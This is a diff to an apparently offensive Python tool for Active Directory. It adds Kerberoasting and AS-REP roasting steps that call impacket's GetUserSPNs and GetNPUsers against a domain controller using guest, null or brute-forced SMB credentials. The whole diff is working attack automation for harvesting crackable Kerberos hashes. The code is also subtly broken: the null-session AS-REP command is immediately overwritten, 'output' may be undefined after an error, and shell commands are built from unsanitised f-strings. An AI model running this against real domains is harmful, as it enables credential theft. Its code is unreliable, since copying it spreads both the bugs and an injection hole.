@@ -70,6 +70,9 @@ def print_cracking_cmd():
 def check_kerberoast(target, domain, user='Guest', passw=''):
     cmd = f'impacket-GetUserSPNs {domain}/{user}:{passw} -dc-ip {target} -stealth'
 
+    if (user == ''):
+        cmd = f'impacket-GetUserSPNs {domain}/jhon.doe -no-pass -dc-ip {target} -stealth'
+
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
     except Exception as e:
@@ -135,8 +138,28 @@ def check_smb_credentials(target, domain):
                 break
         user, passwd = cred.split(':')[:2]
         check_kerberoast(target, domain, user, passwd)
+        check_asreproast(target, domain, user, passwd)
         return True
     return False
+
+
+def check_asreproast(target, domain, user='Guest', passw=''):
+    # NULL
+    if (user == ''):
+        filename = 'smb_users.txt'
+        if not (os.path.exists(filename)): return
+
+        cmd = f'impacket-GetNPUsers -no-pass {domain}/john.doe -dc-ip {target} -usersfile {filename}'
+    # Creds
+    cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target}'
+    
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
+    except Exception as e:
+        printc(f'[-] {e}', RED)
+
+    if output:
+        print(output)
 
 
 def handle_kerberos(target, domain):
@@ -155,7 +178,15 @@ def handle_kerberos(target, domain):
                 mod_smb.bruteforce(target, '445')
 
                 check_smb_credentials(target, domain)
-
+            else:
                 # Check Kerberoast using guest creds
                 check_kerberoast(target, domain)
-            # Check Kerberoast with founded users
+                check_kerberoast(target, domain, '')
+                check_asreproast(target, domain)
+                check_asreproast(target, domain, '')
+        else:
+            # Check Kerberoast using guest creds
+            check_kerberoast(target, domain)
+            check_kerberoast(target, domain, '')
+            check_asreproast(target, domain)
+            check_asreproast(target, domain, '')
